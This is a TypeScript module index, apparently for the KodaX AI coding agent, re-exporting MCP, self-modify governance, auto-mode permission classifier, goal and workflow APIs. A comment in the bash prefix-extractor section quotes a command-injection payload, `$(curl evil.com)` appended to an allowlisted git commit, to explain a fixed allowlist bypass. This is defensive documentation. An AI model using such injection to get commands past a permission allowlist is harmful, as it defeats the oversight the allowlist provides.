  McpServerStatus,
  McpServerLogs,
  McpServerToolList,
  McpServerCatalog,
} from '@kodax-ai/agent';
export {
  McpCapabilityProvider,
  McpServerRuntime,
  createMcpTransport,
  McpAuthRequiredError,
  McpExpiredSessionError,
  defaultMcpCacheDir,
  createMcpCapabilityId,
  normalizeMcpCapabilityId,
  parseMcpCapabilityId,
  searchMcpCatalog,
  getMcpCachePaths,
  buildInitializeCapabilities,
  discoverOAuthEndpoints,
  discoverProtectedResourceMetadata,
  discoverAuthorizationServerMetadata,
  extractResourceMetadataUrl,
  extractInsufficientScope,
  performOAuthLogin,
  loadValidToken,
  registerOAuthClient,
  McpManager,
  createMcpManager,
} from '@kodax-ai/agent';

// FEATURE_087 + FEATURE_088 (v0.7.28): Construction Runtime — runtime-
// generated tools / agents / skills. v0.7.28 ships tool generation only.
export type {
  ConstructionArtifact,
  ArtifactStatus,
  Capabilities,
  ConstructionPolicy,
  ConstructionPolicyVerdict,
  ScriptSource,
  StagedHandle,
  TestResult,
  ToolContent,
  LoadHandlerOptions,
  LoadHandlerScope,
  CreateCtxProxyOptions,
  // Phase 2 static-check pipeline
  AstCheckResult,
  AstRuleId,
  AstRuleViolation,
  SchemaProvider,
  SchemaValidationResult,
  BuildPromptInput,
  LlmReviewClient,
  LlmReviewResult,
  LlmReviewVerdict,
  TestArtifactOptions,
  // FEATURE_090 (v0.7.32): self-modify governance types — surface
  // consumed by the `kodax constructed *` CLI commands (P5/P6) and
  // the REPL self-modify bootstrap. `AgentContent` stays
  // package-private — it's a manifest internal, not a CLI/REPL-facing
  // shape; if a downstream consumer ever needs it we add it back then.
  AgentArtifact,
  KodaXAgentScope,
  AuditEntry,
  AuditEventKind,
  BudgetState,
  DisableState,
  RollbackResult,
  SelfModifyAskUser,
  SelfModifyAskUserInput,
  SelfModifyDiffSummary,
  SelfModifyDiffSeverity,
} from './construction/index.js';

export {
  listCodingDispatchableAgents,
  resolveCodingDispatchableAgent,
} from './external-agents/local-catalog.js';
export type { CodingDispatchableAgentRoute } from './external-agents/local-catalog.js';

export {
  CapabilityDeniedError,
  ConstructionManifestError,
  DEFAULT_HANDLER_TIMEOUT_MS,
  defaultPolicy,
  configureRuntime,
  stage,
  testArtifact,
  activate,
  revoke,
  listArtifacts,
  readArtifact,
  rehydrateActiveArtifacts,
  listConstructed,
  findByVersion,
  listAll,
  loadHandler,
  createCtxProxy,
  // Phase 2 static-check pipeline
  runAstRules,
  validateToolSchemaForProvider,
  buildLlmReviewPrompt,
  parseLlmReviewVerdict,
  runLlmReview,
  // FEATURE_090 (v0.7.32): self-modify governance — audit log,
  // budget counter, deferred resolver swap. CLI surface and REPL
  // bootstrap consume these.
  appendAuditEntry,
  readAuditEntries,
  DEFAULT_SELF_MODIFY_BUDGET,
  readBudget,
  resetBudget,
  remainingSelfModifyBudget,
  disableSelfModify,
  readDisableState,
  rollbackSelfModify,
  drainPendingSwaps,
  hasPendingSwap,
  resolveConstructedAgent,
  REPO_EXPLORER_AGENT_NAME,
  REPO_EXPLORER_TOOL_NAMES,
  ensureBuiltinRepoExplorerAgent,
  // FEATURE_191 (v0.7.43) — markdown-defined agent loader. REPL bootstrap
  // calls `loadAgentsFromMarkdown` after `rehydrateActiveArtifacts` so
  // `.kodax/agents/*.md` agents register alongside on-disk artifacts.
  loadAgentsFromMarkdown,
  // FEATURE_197 (v0.7.43) — read-only discovery API for SDK consumers
  // (e.g. agent-picker UIs) that need to list markdown agents without
  // triggering admission/registration side effects.
  discoverMarkdownAgents,
  loadMarkdownAgentScope,
  // Test-only — reset module-singleton state between hermetic test runs.
  _resetRuntimeForTesting,
} from './construction/index.js';
// FEATURE_191 + FEATURE_197 — type exports for the markdown loader +
// discovery surfaces (consumed by REPL `BootstrapConstructionRuntimeResult`
// + SDK embedders building agent-picker UIs).
export type {
  LoadAgentsFromMarkdownOptions,
  LoadAgentsFromMarkdownResult,
  LoadMarkdownAgentScopeOptions,
  LoadMarkdownAgentScopeResult,
  MarkdownLoadFailure,
  MarkdownAgentLoadWarning,
  MarkdownAgentToolFilter,
  LoadedMarkdownAgent,
  DiscoveredMarkdownAgent,
  DiscoverMarkdownAgentsResult,
} from './construction/index.js';

// ============== FEATURE_092 (v0.7.33): Auto-Mode Classifier ==============
//
// Public surface for the auto-mode tool-call classifier. Phase 2b.7b/2b.8
// will internally consume these to register the guardrail and surface
// /auto-engine, /auto-model commands; the eval suite consumes the same
// surface to measure classifier quality.
export {
  classify,
  CLASSIFIER_MAX_OUTPUT_TOKENS,
  DEFAULT_CLASSIFIER_TIMEOUT_MS,
  DEFAULT_CLASSIFIER_RETRY_TIMEOUT_MS,
} from './guardrails/auto-mode/classify.js';
export type {
  ClassifyOptions,
  ClassifyDecision,
  ClassifierAttemptDiagnostics,
  ClassifierAttemptOutcome,
  ClassifierFailureKind,
} from './guardrails/auto-mode/classify.js';
export * from './guardrails/auto-mode/permission-analyzer.js';
export * from './permissions/permission.js';
export * from './permissions/agent-home-policy.js';
export * from './permissions/bash-ast.js';
export * from './permissions/powershell-mutation.js';
export * from './permissions/shell-command-sets.js';
export {
  loadAutoRules,
  parseAutoRules,
  computeRulesFingerprint,
  trustProjectRules,
  readTrustState,
} from './guardrails/auto-mode/rules.js';
export type {
  AutoRules,
  RulesLoadResult,
  LoadedRulesSource,
  SkippedRulesSource,
  RulesLoadError,
  TrustState,
} from './guardrails/auto-mode/rules.js';
export { buildClassifierPrompt } from './guardrails/auto-mode/classifier-prompt.js';
export type {
  BuildClassifierPromptInput,
  ClassifierPrompt,
} from './guardrails/auto-mode/classifier-prompt.js';
export { stripAssistantText } from './guardrails/auto-mode/transcript-strip.js';
export type { StripOptions } from './guardrails/auto-mode/transcript-strip.js';
export { parseClassifierOutput } from './guardrails/auto-mode/parse-output.js';
export type {
  ClassifierDecision,
  ClassifierHazard,
  ClassifierObservedProtocol,
  ClassifierOutputWarningCode,
  ClassifierParseFailureCode,
  ClassifierProtocol,
} from './guardrails/auto-mode/parse-output.js';
// Auto-mode denial counter (cumulative + consecutive block tally) — distinct
// from the FEATURE_044/045 input-signature `DenialTracker` exported above.
export {
  createDenialTracker as createAutoModeDenialTracker,
  recordBlock as recordAutoModeBlock,
  recordAllow as recordAutoModeAllow,
  shouldFallback as autoModeDenialShouldFallback,
  CONSECUTIVE_THRESHOLD as AUTO_MODE_DENIAL_CONSECUTIVE_THRESHOLD,
  CUMULATIVE_THRESHOLD as AUTO_MODE_DENIAL_CUMULATIVE_THRESHOLD,
} from './guardrails/auto-mode/denial-tracker.js';
export type { DenialTracker as AutoModeDenialTracker } from './guardrails/auto-mode/denial-tracker.js';
export {
  createCircuitBreaker,
  recordError as recordBreakerError,
  shouldFallback as breakerShouldFallback,
  ERROR_THRESHOLD as BREAKER_ERROR_THRESHOLD,
  WINDOW_MS as BREAKER_WINDOW_MS,
} from './guardrails/auto-mode/circuit-breaker.js';
export type { CircuitBreaker } from './guardrails/auto-mode/circuit-breaker.js';
export {
  parseModelSpec,
  resolveClassifierModel,
} from './guardrails/auto-mode/model-resolver.js';
export type {
  ParsedModelSpec,
  ResolveSource,
  ResolveClassifierModelOptions,
  ResolvedClassifierModel,
} from './guardrails/auto-mode/model-resolver.js';
export {
  createAgentHomeShellBoundaryGuardrail,
  createAutoModeToolGuardrail,
} from './guardrails/auto-mode/guardrail.js';
export type {
  AgentHomeShellBoundaryGuardrailOptions,
  AutoModeEngine,
  AutoModeSharedState,
  AutoModeGuardrailConfig,
  AutoModeToolGuardrail,
  AutoModeAskUser,
  AutoModeAskUserVerdict,
  AutoModeDecisionDiagnostics,
  AutoModeRulesContext,
  AutoModeRulesDecision,
  AutoModeRulesEvaluator,
  AutoModePermissionBoundary,
  AutoModePermissionTarget,
  AutoModePermissionOperation,
  AutoModePermissionReview,
  AutoModeCallAnalyzer,
  AutoModeStats,
} from './guardrails/auto-mode/guardrail.js';

// FEATURE_158 (v0.7.39): signal collector contract for the auto-mode
// classifier prompt + UI Scope/Risk rendering. REPL injects path-aware
// bash collector via `extraCollectors` (see `extraCollectors` on
// AutoModeGuardrailConfig).
export {
  collectAllSignals,
  type SignalCollector,
  type ToolCallSignal,
} from './guardrails/auto-mode/signals.js';
export { bashSignalCollector } from './guardrails/auto-mode/bash-signals.js';
export { fileSignalCollector } from './guardrails/auto-mode/file-signals.js';
export {
  checkAbsoluteDeny,
  type AbsoluteDenyCheck,
  type AbsoluteDenyResult,
  type AbsoluteDenyMatch,
  type AbsoluteDenyMiss,
  type TierZeroPatternId,
} from './guardrails/auto-mode/absolute-denylist.js';
export {
  speculativeRace,
  readWindowFromEnv as readSpeculativeWindowFromEnv,
  DEFAULT_WINDOW_MS as DEFAULT_SPECULATIVE_WINDOW_MS,
  type SpeculativeResult,
} from './guardrails/auto-mode/speculative.js';

// ============== FEATURE_153 (v0.7.38): Bash Command Prefix Extractor ==============
//
// LLM-backed prefix extraction for bash allowlist matching, replacing the
// pre-FEATURE_153 naive `command.startsWith(pattern)` check that was vulnerable
// to command injection (`git commit -m "x" $(curl evil.com)` matched a
// `Bash(git commit:*)` allowlist pattern). Extractor + LRU-cached factory live
// in this module so the auto-mode classifier and the prefix extractor share
// the same `sideQuery` / cost-tracker / abort plumbing.
export {
  BASH_POLICY_SPEC,
  extractCommandPrefix,
  createBashPrefixExtractor,
} from './guardrails/auto-mode/bash-prefix-extractor.js';
export type {
  BashPrefixResult,
  ExtractCommandPrefixOptions,
  BashPrefixExtractor,
  CreateBashPrefixExtractorOptions,
} from './guardrails/auto-mode/bash-prefix-extractor.js';

// ============== FEATURE_192 v0.7.44 — /goal Persistent Goal ==============
export {
  BLOCKER_REQUIRED_CONSECUTIVE_TURNS,
  applyAccountingDelta,
  buildBlockedGoal,
  buildCompleteGoal,
  buildCreatedGoal,
  buildGoalRuntimeBinding,
  buildPausedGoal,
  buildResumedGoal,
  goalTokenDelta,
  isValidTokenBudget,
  makeDisabledGoalToolsContext,
  recordBlockerAttempt,
  resetBlockerCounter,
  shouldFlipBudgetLimited,
  turnWallTimeDelta,
  verifyGoalCompletion,
  withGoalBeforeNextTurn,
  withGoalStopHook,
} from './goal/index.js';
export type {
  BlockerAttemptResult,
  GoalBlockedResult,
  GoalCompleteResult,
  GoalCompletionVerifier,
  GoalCreateInput,
  GoalLifecycleContext,
  GoalRuntimeBinding,
  GoalRuntimeBindingDeps,
  GoalToolsContext,
  VerifyGoalCompletionOptions,
} from './goal/index.js';

// FEATURE_209 (v0.7.45): tracing activation in production.
export { bootstrapTracing, TRACING_ENV } from './runtime/tracing-bootstrap.js';
export type { BootstrapTracingOptions } from './runtime/tracing-bootstrap.js';

// FEATURE_218 (v0.7.47): self-knowledge manual — resolver reused by the
// kodax_manual tool and the REPL `/help <topic>` path.
export { resolveKodaXManual } from './self-knowledge/resolver.js';
// FEATURE_221: MANUAL_REGISTRY lets an SDK consumer read the base topic bodies
// at build time (to write accurate product docs / decide what to keep);
// KODAX_UNDERLYING_CAPABILITY_TOPICS is the recommended subset a white-label
// consumer keeps when replacing the manual (selfManual.baseTopics).
export {
  MANUAL_TOPIC_IDS,
  MANUAL_REGISTRY,
  KODAX_UNDERLYING_CAPABILITY_TOPICS,
} from './self-knowledge/registry.js';
export {
  SELF_KNOWLEDGE_ROUTING_RULE,
  buildSelfKnowledgeRoutingRule,
} from './self-knowledge/routing-rule.js';
// FEATURE_221: the productName-parameterized kodax_manual tool description
// (white-label). Sibling to buildSelfKnowledgeRoutingRule.
export {
  buildManualToolDescription,
  withManualToolBranding,
} from './self-knowledge/tool-description.js';
export type {
  KodaXManualTopicId,
  KodaXManualIndexTopic,
  KodaXManualTopicInput,
  // FEATURE_221: KodaXManualTopic / KodaXManualSource are the value types of the
  // newly-exported MANUAL_REGISTRY, so a consumer reading base topics can name them.
  KodaXManualTopic,
  KodaXManualSource,
  ResolveKodaXManualInput,
  ResolveKodaXManualOptions,
  ResolveKodaXManualResult,
} from './self-knowledge/types.js';

// FEATURE_132 (v0.7.47): native LSP integration — edit-time diagnostics
// reflux. Hosts inject/own a service via `options.context.lspService` and
// call `shutdownAll()` on teardown; default is the process-wide singleton.
export {
  LspService,
  getDefaultLspService,
  shutdownDefaultLspService,
  languageIdForPath,
  report as reportLspDiagnostics,
  LSP_SERVERS,
} from './lsp/index.js';
export type {
  LspServerInfo,
  DiagnosticsRequest,
  LspServiceConfig,
} from './lsp/index.js';

// FEATURE_217 (v0.7.49) — Dynamic Workflow Harness: agent backend +
// built-in workflows + run-graph + headless orchestrator.
export * from './workflows/index.js';
export {
  CodingActorSession,
  actorQueueId,
  createExternalActorTurnExecutor,
  createLocalCodingActorControl,
} from './agent-runtime/actor-runtime.js';
export type { CodingActorSessionOptions } from './agent-runtime/actor-runtime.js';
